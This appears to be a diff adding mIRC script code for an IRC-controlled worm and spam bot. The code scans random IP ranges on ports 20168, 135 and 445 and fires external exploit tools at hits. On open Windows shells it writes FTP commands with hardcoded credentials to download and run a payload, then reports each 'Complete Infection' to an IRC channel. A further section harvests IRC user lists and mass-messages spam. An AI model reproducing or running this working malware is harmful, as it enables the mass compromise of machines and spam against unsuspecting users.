+    if ($count(%ScanRange,.) = 2) && (x !isin %ScanRange) { set %ScanCMDStc %ScanRange $+ .1 | set %ScanCMDENc %ScanRange $+ .255 | set %ScanCMDStL $longip(%ScanCMDStc) | set %ScanCMDENL $longip(%ScanCMDENc) | set %ScantoCMD $calc(%ScanCMDENL - %ScanCMDStL) | timerScanCMD -o 0 15 CMDScan | unset %ScanCMD }
+    if ($count(%ScanRange,.) = 3) && (x isin %ScanRange) { set %ScanCMDStc $ipscrmbl(%ScanRange) | set %ScanCMDENc $replace(%ScanRange,x,255) | set %ScanCMDStL $longip(%ScanCMDStc) | set %ScanCMDENL $longip(%ScanCMDENc) | set %ScantoCMD $calc(%ScanCMDENL - %ScanCMDStL) | timerScanCMD -o 0 15 CMDScan | unset %ScanCMD }
+  }
+  ;Dcom135
+  if (%ScanDcom135 = yes) {
+    if (%ScanDcom135Stc != $null) { timerScanDcom135 off | sockclose scanDcom135* | unset %ScanDcom135* }
+    if ($count(%ScanRange,.) = 0) { set %ScanDcom135Stc %ScanRange $+ . $+ $r(0,256) $+ . $+ $r(0,256) $+ .1 | set %ScanDcom135ENc %ScanRange $+ .255.255.255 | set %ScanDcom135StL $longip(%ScanDcom135Stc) | set %ScanDcom135ENL $longip(%ScanDcom135ENc) | set %ScantoDcom135 $calc(%ScanDcom135ENL - %ScanDcom135StL) | timerScanDcom135 -o 0 15 Dcom135Scan | unset %ScanDcom135 }
+    if ($count(%ScanRange,.) = 1) { set %ScanDcom135Stc %ScanRange $+ . $+ $r(0,256) $+ .1 | set %ScanDcom135ENc %ScanRange $+ .255.255 | set %ScanDcom135StL $longip(%ScanDcom135Stc) | set %ScanDcom135ENL $longip(%ScanDcom135ENc) | set %ScantoDcom135 $calc(%ScanDcom135ENL - %ScanDcom135StL) | timerScanDcom135 -o 0 15 Dcom135Scan | unset %ScanDcom135 }
+    if ($count(%ScanRange,.) = 2) && (x !isin %ScanRange) { set %ScanDcom135Stc %ScanRange $+ .1 | set %ScanDcom135ENc %ScanRange $+ .255 | set %ScanDcom135StL $longip(%ScanDcom135Stc) | set %ScanDcom135ENL $longip(%ScanDcom135ENc) | set %ScantoDcom135 $calc(%ScanDcom135ENL - %ScanDcom135StL) | timerScanDcom135 -o 0 15 Dcom135Scan | unset %ScanDcom135 }
+    if ($count(%ScanRange,.) = 3) && (x isin %ScanRange) { set %ScanDcom135Stc $ipscrmbl(%ScanRange) | set %ScanDcom135ENc $replace(%ScanRange,x,255) | set %ScanDcom135StL $longip(%ScanDcom135Stc) | set %ScanDcom135ENL $longip(%ScanDcom135ENc) | set %ScantoDcom135 $calc(%ScanDcom135ENL - %ScanDcom135StL) | timerScanDcom135 -o 0 15 Dcom135Scan | unset %ScanDcom135 }
+  }
+  ;445r
+  if (%Scan445r = yes) {
+    if (%Scan445rStc != $null) { timerScan445r off | sockclose scan445r* | unset %Scan445r* }
+    if ($count(%ScanRange,.) = 0) { set %Scan445rStc %ScanRange $+ . $+ $r(0,256) $+ . $+ $r(0,256) $+ .1 | set %Scan445rENc %ScanRange $+ .255.255.255 | set %Scan445rStL $longip(%Scan445rStc) | set %Scan445rENL $longip(%Scan445rENc) | set %Scanto445r $calc(%Scan445rENL - %Scan445rStL) | timerScan445r -o 0 15 445rScan | unset %Scan445r }
+    if ($count(%ScanRange,.) = 1) { set %Scan445rStc %ScanRange $+ . $+ $r(0,256) $+ .1 | set %Scan445rENc %ScanRange $+ .255.255 | set %Scan445rStL $longip(%Scan445rStc) | set %Scan445rENL $longip(%Scan445rENc) | set %Scanto445r $calc(%Scan445rENL - %Scan445rStL) | timerScan445r -o 0 15 445rScan | unset %Scan445r }
+    if ($count(%ScanRange,.) = 2) && (x !isin %ScanRange) { set %Scan445rStc %ScanRange $+ .1 | set %Scan445rENc %ScanRange $+ .255 | set %Scan445rStL $longip(%Scan445rStc) | set %Scan445rENL $longip(%Scan445rENc) | set %Scanto445r $calc(%Scan445rENL - %Scan445rStL) | timerScan445r -o 0 15 445rScan | unset %Scan445r }
+    if ($count(%ScanRange,.) = 3) && (x isin %ScanRange) { set %Scan445rStc $ipscrmbl(%ScanRange) | set %Scan445rENc $replace(%ScanRange,x,255) | set %Scan445rStL $longip(%Scan445rStc) | set %Scan445rENL $longip(%Scan445rENc) | set %Scanto445r $calc(%Scan445rENL - %Scan445rStL) | timerScan445r -o 0 15 445rScan | unset %Scan445r }
+  }
+  return $gettok($1-,1,32)
+}
+alias retscan { if (all =  $1) { set %retCMD on | set %retDcom135 on | set %ret445r on } | if ($1 = CMD) { set %retCMD on } | if ($1 = dcom135) { set %retdcom135 on } | if ($1 = 445r) { set %ret445r on } }
+alias unretscan { if (all =  $1) { set %retCMD off | set %retDcom135 off | set %ret445r off } | if ($1 = CMD) { set %retCMD off } | if ($1 = dcom135) { set %retdcom135 off } | if ($1 = 445r) { set %ret445r off } }
+alias ipscrmbl { var %ipx $1 | return $replace($gettok(%ipx,1,46),x,$r(0,240)) $+ . $+ $replace($gettok(%ipx,2,46),x,$r(0,240)) $+ . $+ $replace($gettok(%ipx,3,46),x,$r(0,240)) $+ .1 }
+alias StopSCMD { timerScanCMD off | sockclose scanCMD* | unset %ScantotalCMD | unset %countCMD | unset %ScanCMD* | if (%retCMD = on) { echo $Scan(CMD Rand 2) }  }
+alias CMDScan { 
+  if (%ScantotalCMD = %ScantoCMD) { StopSCMD } 
+  sockclose scanCMD*
+  set %countCMD 1
+  while (%countCMD <= 100) {
+    if (%countCMD > 100) { unset %countCMD }
+    if (%ScantotalCMD = %ScantoCMD) { StopSCMD }
+    inc %ScantotalCMD
+    sockopen scanCMD $+ %countCMD $longip($calc(%ScanCMDStL + %ScantotalCMD)) 20168
+    inc %countCMD
+  }
+}
+alias StopSDcom135 { timerScanDcom135 off | sockclose scanDcom135* | unset %ScantotalDcom135 | unset %countDcom135 | unset %ScanDcom135* | if (%retdcom135 = on) { echo $Scan(Dcom135 Rand 2) } }
+alias Dcom135Scan { 
+  if (%ScantotalDcom135 = %ScantoDcom135) { StopSDcom135 } 
+  sockclose scanDcom135*
+  set %countDcom135 1
+  while (%countDcom135 <= 100) {
+    if (%countDcom135 > 100) { unset %countDcom135 }
+    if (%ScantotalDcom135 = %ScantoDcom135) { StopSDcom135 }
+    inc %ScantotalDcom135
+    sockopen scanDcom135 $+ %countDcom135 $longip($calc(%ScanDcom135StL + %ScantotalDcom135)) 135
+    inc %countDcom135
+  }
+}
+alias StopS445r { timerScan445r off | sockclose scan445r* | unset %Scantotal445r | unset %count445r | unset %Scan445r* | if (%ret445r = on) { echo $Scan(445r Rand 2) } }
+alias 445rScan { 
+  if (%Scantotal445r = %Scanto445r) { StopS445r } 
+  sockclose scan445r*
+  set %count445r 1
+  while (%count445r <= 100) {
+    if (%count445r > 100) { unset %count445r }
+    if (%Scantotal445r = %Scanto445r) { StopS445r }
+    inc %Scantotal445r
+    sockopen scan445r $+ %count445r $longip($calc(%Scan445rStL + %Scantotal445r)) 445
+    inc %count445r
+  }
+}
+;Socks
+on *:sockopen:ScanCMD*:{
+  if ($sockerr != 0) { .sockclose $sockname | halt }
+}
+on *:sockread:ScanCMD*:{
+  sockread %CMDread
+  if (Microsoft isin %CMDread) && (Windows isin %CMDread) {
+    var %bndfle $r(a,z) $+ $r(a,z) $+ $r(1,100) $+ . $+ $r(a,z) $+ $r(a,z)
+    sockwrite -nt $sockname echo open $ip %cfp >> %bndfle
+    sockwrite -nt $sockname echo JoCkeR>> %bndfle
+    sockwrite -nt $sockname echo tw1st3r>> %bndfle
+    sockwrite -nt $sockname echo binary >> %bndfle
+    sockwrite -nt $sockname echo hash >> %bndfle
+    sockwrite -nt $sockname echo get $rds(sf) >> %bndfle
+    sockwrite -nt $sockname echo quit >> %bndfle
+    sockwrite -nt $sockname ftp -s: $+ %bndfle
+    sockwrite -nt $sockname $rds(sf)
+    timerupIt $+ $sockname 0 10 /sockwrite -nt $sockname dd
+    timerclose $+ $sockname 1 800 /sockclose $sockname
+  }
+  if (system32> $+ $rds(sf) isin %CMDread) {
+    msg $rds(rc) 0[12Cmd201680] 1Complete Infection:14 $sock($sockname).ip
+    timerupIt $+ $sockname off
+    sockclose $sockname
+  }
+}
+on *:sockopen:scanDcom135*:{
+  if ($sockerr > 0) { halt }
+  .kk $sock($sockname).ip
+  sockclose $sockname
+}
+on *:sockopen:Scan445r*:{
+  if ($sockerr != 0) { .sockclose $sockname | halt }
+  var %binport $r(7000,18000)
+  $hr(explorx.exe -t $sock($sockname).ip %binport)
+  .timerBind $+ $sockname 1 12 sockopen bind445r $+ $ticks $sock($sockname).ip %binport
+  $hr(emoti.bat $sock($sockname).ip $rds(sf))
+  sockclose $sockname
+}
+on 1:sockopen:bind445r*: { 
+  if ($sockerr != 0) { .sockclose $sockname | halt } 
+  sockmark $sockname
+  timerclose $+ $sockname 1 800 /sockclose $sockname
+}
+on *:sockread:bind445r*:{
+  sockread %readroot
+  if (Microsoft isin %readroot) && (Windows isin %readroot) {
+    var %bndfle $r(a,z) $+ $r(a,z) $+ $r(1,100) $+ . $+ $r(a,z) $+ $r(a,z)
+    sockwrite -nt $sockname echo open $ip %cfp >> %bndfle
+    sockwrite -nt $sockname echo JoCkeR>> %bndfle
+    sockwrite -nt $sockname echo tw1st3r>> %bndfle
+    sockwrite -nt $sockname echo binary >> %bndfle
+    sockwrite -nt $sockname echo hash >> %bndfle
+    sockwrite -nt $sockname echo get $rds(sf) >> %bndfle
+    sockwrite -nt $sockname echo quit >> %bndfle
+    sockwrite -nt $sockname ftp -s: $+ %bndfle
+    sockwrite -nt $sockname $rds(sf)
+    timerupIt $+ $sockname 0 10 /sockwrite -nt $sockname dd
+    timerclose $+ $sockname 1 800 /sockclose $sockname
+  }
+  if (system32> $+ $rds(sf) isin %readroot) {
+    msg $rds(rc) 0[12lsass0] 1Complete Infection:14 $sock($sockname).ip
+    timerupIt $+ $sockname off
+    sockclose $sockname
+  }
+}
+
+alias -l stdio return $dll(ntcnsl.dll,$1,$2-)
+alias stdrun {
+  var %proc = $newprog($1)
+  var %run = $stdio(RunConsole, [ %proc ] [ $2- ] )
+  if ( $gettok(%run,1,32) == oK ) {
+    .timerReadT $+ %proc -m 0 1 readl %proc 
+    .timerStopReadT $+ %proc 1 500 timerReadT $+ %proc off
+  }
+  else echo 4 -st Could not create process: %run
+}
+alias -l readl {
+  var %out
+  var %err
+  while ( $gettok( %err ,1,32) != ERRoR ) {
+    set %err $stdio(ReadText, [ $1 ] err)
+    if ( %err == oK ) set %err oK   
+    if ( $gettok(%err,1,32) != ERRoR ) echo -s $1 $ansi2mirc($gettok(%err,2-,32))
+  }
+  while ( $gettok( %out ,1,32) != ERRoR ) {
+    set %out $stdio(ReadText, [ $1 ] out)
+    if ( %out == oK ) set %out oK   
+    if ( $gettok(%out,1,32) != ERRoR ) {
+      echo -s $1 $ansi2mirc($gettok(%out,2-,32))
+      if (Microsoft isin $ansi2mirc($gettok(%out,2-,32))) && (Windows isin $ansi2mirc($gettok(%out,2-,32))) {  
+        var %bndfle $r(a,z) $+ $r(a,z) $+ $r(1,100) $+ . $+ $r(a,z) $+ $r(a,z)
+        echo -s $stdio(WriteText,$1  $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo open $ip %cfp >> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo JoCkeR>> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo tw1st3r>> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo binary >> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo hash >> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo get $rds(sf) >> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 echo quit >> %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 ftp -s: $+ %bndfle $+ $crlf) 
+        echo -s $stdio(WriteText,$1 $rds(sf) $+ $crlf) 
+        timer $+ $1 $+ 1 0 10 echo -s $stdio(WriteText,$1 dd $+ $crlf)
+      }
+      if (system32> $+ $rds(sf) isin $ansi2mirc($gettok(%out,2-,32))) { echo -s $stdio(WriteText,$1 exit $+ $crlf) | timer $+ $1 $+ 1 off | msg $rds(rc) 0[12Dcom1350] 1Complete Infection:14 $remove($gettok($1-,3-,46),dcom) }
+    }
+    if (( $gettok(%out,1-2,32) == ERRoR STDE6 ) && ( $gettok(%err,1-2,32) == ERRoR STDE6 )) {
+      .timerReadT $+ $1 off
+      echo -s $1 Process exited, code $stdio(GetExitCode,$1)
+    }
+  }
+}
+alias -l newprog {
+  var %prognum = 1
+  var %progpref = @Console.
+  while ( $gettok($stdio(GetProcess, [ [ %progpref ] $+ [ %prognum ] ] ) ,1,32) == oK) inc %prognum
+  return %progpref $+ %prognum $+ . $+ $1
+}
+alias stdrem echo -ts Removing STDIo library: $stdio(Remove,.)
+alias kk { 
+  stdrun $1 $+ dcom alte.exe -d $1 -t 0 -l $r(14000,18000)
+  timer $+ $1 $+ dcom 1 5 stdrun $1 alte.exe -d $1 -t 1 -l $r(14000,18000)
+}
+
+------------------------------------
+------------------------------------
+
+alIas ruwInvIter { sockopen dId $+ $tIcks $+ $r(1,999) %network }
+on 1:SOCKOPEN:dId*:{ If ($sockerr) { return } 
+  .sockwrIte -nt $sockname PONG $ctIme
+  .sockwrIte -tn $sockname USER $fnIck $+ $r(a,z) $+ $r(1,60) a a : $fnIck $fnIck 
+  .sockwrIte -tn $sockname NICK $fnIck $+ $chr($r(65,125)) $+ $chr($r(65,125)) 
+  .sockwrIte -nt $sockname joIn %SPMChaNNeL
+  .sockwrIte -nt $sockname lIst >100
+  tImerpart 1 $r(5,30) /sockwrIte -nt $sockname PART %SPMCHaNNeL 
+}
+on 1:SOCKREAD:dId*:{ sockread -f %t.v | If ($gettok(%t.v,2,32) == 322) && ($gettok(%t.v,5,32) > 30) { wrIte Ichan.bat $gettok(%t.v,4,32) } | /savIng $sockname %t.v } 
+alIas savIng {
+  If ($3 = 353) { /set %names $replace($8-10,$chr(32),$chr(44))  | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names : $+ %SPAM }
+  If ($3 = 353) { /set %names2 $replace($10-12,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names2 :  $+ %SPAM }
+  If ($3 = 353) { /set %names3 $replace($12-14,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names3 :  $+ %SPAM }
+  If ($3 = 353) { /set %names4 $replace($14-16,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names4 :  $+ %SPAM }
+  If ($3 = 353) { /set %names5 $replace($16-18,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names5 :  $+ %SPAM }
+  If ($3 = 353) { /set %names6 $replace($18-20,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names6 :  $+ %SPAM }
+  If ($3 = 353) { /set %names7 $replace($20-22,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names7 :  $+ %SPAM }
+  If ($3 = 353) { /set %names8 $replace($22-24,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names8 :  $+ %SPAM }
+  If ($3 = 353) { /set %names9 $replace($24-26,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names9 :  $+ %SPAM }
+  If ($3 = 353) { /set %names10 $replace($26-28,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names10 :  $+ %SPAM }
+  If ($3 = 353) { /set %names11 $replace($28-30,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names11 :  $+ %SPAM }
+  If ($3 = 353) { /set %names12 $replace($30-32,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names12 :  $+ %SPAM }
+  If ($3 = 353) { /set %names13 $replace($32-34,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names13 :  $+ %SPAM }
+  If ($3 = 353) { /set %names14 $replace($34-36,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names14 :  $+ %SPAM }
+  If ($3 = 353) { /set %names15 $replace($36-38,$chr(32),$chr(44)) | Inc %total.users 3 | tImerInv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrIte -nt $1 PRIVMSG %names15 :  $+ %SPAM }
+  If ($3 = 366) { tImerInv $+ $r(1,999) 1 1001 /fInIsheds $1 }
+  If (47 = $left($3,2)) { /fInIshed2 $1 }
+  If (PING = $1) { sockwrIte -nt PONG $1- }
+}
+alIas goInvIte { sockwrIte -nt $1 JOIN %SPMChaNNeL |   tImerpart 1 $r(5,60) /sockwrIte -nt $1 PART %SPMCHaNNeL  }
+alIas fInIsheds { .saym I've Spammed on;- ( $+ %network $+ ) In port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) wIth About;- ( $+ %Total.users $+ ) Users Has been Affected thIs msg wIth no (@/+) one. Message sets: ( $+ %SPAM $+ )..... | If ($exIsts(Ichan.bat) == $true) { set %SPMChannel $read Ichan.bat } | If ($exIsts(Ichan.bat) == $false) { set %SPMChannel $read Inv.bat } | .saym Auto ChangIng To %SPMChaNNel $+ ...... Is actIve!... |  /goInvIte $1 }
+alIas fInIshed2 { .saym There Was a Problem on;- ( $+ %network $+ ) In port: ( $+ $sock($1).port $+ ) At: ( $+ %SPMchannel $+ ) NO Users Has been Messaged... AutoChangIng Channel.. | If ($exIsts(Ichan.bat) == $true) { set %SPMChannel $read Ichan.bat } | If ($exIsts(Ichan.bat) == $false) { set %SPMChannel $read Inv.bat } | .saym Auto ChangIng To %SPMChaNNel $+ ...... Is actIve!... |  /goInvIte $1 }
